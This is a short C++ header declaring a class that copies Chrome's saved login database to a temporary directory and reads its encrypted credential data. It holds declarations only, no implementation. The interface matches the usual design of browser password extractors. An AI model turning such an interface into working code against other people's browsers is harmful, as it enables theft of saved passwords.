#include <string>

class CBrowserInfo
{
public:
	CBrowserInfo();
	~CBrowserInfo();
	void ReadChromeLoginData();

private:
	bool ReadEncryptData(const std::string &sLoginDataPath);
	bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath);
};